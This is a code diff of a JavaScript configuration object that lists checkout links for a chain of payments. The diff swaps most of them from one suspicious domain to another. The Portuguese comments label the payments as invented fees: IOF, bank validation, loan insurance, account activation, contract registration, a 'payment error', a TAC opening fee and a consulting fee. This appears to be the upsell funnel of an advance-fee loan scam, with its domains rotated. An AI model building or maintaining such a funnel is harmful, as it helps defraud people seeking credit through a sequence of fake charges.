@@ -1,15 +1,15 @@
    const baseLinks = {
   up1: "https://pay.app-agil.online/PyE2Zy8MKb23qRb", // IOF
-  up2: "https://pay.mercadopremio.store/65XDZB8L4JpgVJw", // Validação Bancaria
-  up3: "https://pay.mercadopremio.store/n1NLgwJ7BMpGMxE", // Seguro Prestamista "tarifa de cadastro"
-  up4: "https://pay.mercadopremio.store/N1nVZpYmNbLGlM6", // NFe
-  up5: "https://pay.mercadopremio.store/kYL6geWm54oZrKM", // Ativar conta
-  up6: "https://pay.mercadopremio.store/DPXw3XemwEOZzmp", // Taxa de registro do contrato
-  up7: "https://pay.mercadopremio.store/eApQgz2jBMJgEb7", // ParabÃ©ns, 20k adicional
-  up8: "https://pay.mercadopremio.store/DYp0ZxVEBMQgmvX", // Erro no pagamento - 14,06
-  up9: "https://pay.mercadopremio.store/P5LNZ8zMRAOgaRy", // APP - 11,99
-  up10: "https://pay.mercadopremio.store/nWrxGWALw7O3654", // Taxa de Abertura TAC - 16,92
-  up11: "https://pay.mercadopremio.store/lDW0ZaJmeaRGN7E", // Taxa de Consultoria Financeira - 19,53
+  up2: "https://pay.final-aqui.space/q510ZObLq5J3E9D", // Validação Bancaria
+  up3: "https://pay.final-aqui.space/zj6aGnAm6JlZwlK", // Seguro Prestamista "tarifa de cadastro"
+  up4: "https://pay.final-aqui.space/VroegN1LkYpGKwj", // NFe
+  up5: "https://pay.final-aqui.space/rn4RgQvL4Bl3wBV", // Ativar conta
+  up6: "https://pay.final-aqui.space/bz5KZbVm9QYZ7dL", // Taxa de registro do contrato
+  up7: "https://pay.final-aqui.space/PyE2Zy8r6Yn3qRb", // ParabÃ©ns, 20k adicional
+  up8: "https://pay.final-aqui.space/7vJOGY4LnVVZKXd", // Erro no pagamento - 14,06
+  up9: "https://pay.final-aqui.space/yOeXZKlLODDGAQa", // APP - 11,99
+  up10: "https://pay.final-aqui.space/z0qn35dYeWVg98m", // Taxa de Abertura TAC - 16,92
+  up11: "https://pay.final-aqui.space/meABG9dLrjQZ6Ea", // Taxa de Consultoria Financeira - 19,53
   up12: "https://google.com", // Taxa de Processamento Administrativo - 31,92
 };
 
